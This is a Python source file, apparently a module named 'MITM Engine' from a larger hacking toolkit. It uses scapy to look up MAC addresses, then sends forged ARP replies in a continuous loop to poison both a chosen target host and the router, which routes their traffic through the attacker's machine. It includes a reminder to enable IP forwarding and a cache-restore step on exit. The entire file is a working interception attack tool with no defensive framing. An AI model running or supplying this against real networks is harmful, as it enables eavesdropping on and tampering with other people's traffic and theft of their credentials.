from scapy.all import ARP, send, Ether, srp
import time
from rich.console import Console
from core.ui import draw_header

console = Console()


def get_mac(ip):
    try:
        ans, _ = srp(Ether(dst="ff:ff:ff:ff:ff:ff") /
                     ARP(pdst=ip), timeout=2, verbose=False)
        if ans:
            return ans[0][1].hwsrc
    except:
        return None
    return None


def start_mitm():
    draw_header("MITM Engine")
    target = console.input("[bold yellow]Target IP: [/bold yellow]")
    router = console.input("[bold yellow]Router IP: [/bold yellow]")

    if not target or not router:
        return

    console.print("[bold blue][*][/bold blue] Resolving MAC addresses...")
    t_mac = get_mac(target)
    r_mac = get_mac(router)

    if not t_mac or not r_mac:
        console.print(
            "[red]Failure: MAC resolution failed. Check host availability.[/red]")
        input("\nPress Enter...")
        return

    console.print(
        f"[bold red][!] Intercepting: {target} <--> {router}[/bold red]")
    console.print(
        "[dim]Note: Ensure IP Forwarding is enabled on your host OS.[/dim]")

    try:
        while True:
            # Poison Target (Tell target I am the router)
            send(ARP(op=2, pdst=target, hwdst=t_mac, psrc=router), verbose=False)
            # Poison Router (Tell router I am the target)
            send(ARP(op=2, pdst=router, hwdst=r_mac, psrc=target), verbose=False)
            time.sleep(2)
    except KeyboardInterrupt:
        console.print("\n[yellow]Restoring network integrity...[/yellow]")
        # Re-ARPing correctly to fix the target's cache
        send(ARP(op=2, pdst=target, hwdst="ff:ff:ff:ff:ff:ff",
             psrc=router, hwsrc=r_mac), count=5, verbose=False)
        send(ARP(op=2, pdst=router, hwdst="ff:ff:ff:ff:ff:ff",
             psrc=target, hwsrc=t_mac), count=5, verbose=False)
        console.print("[green]Done.[/green]")
        input("\nPress Enter...")
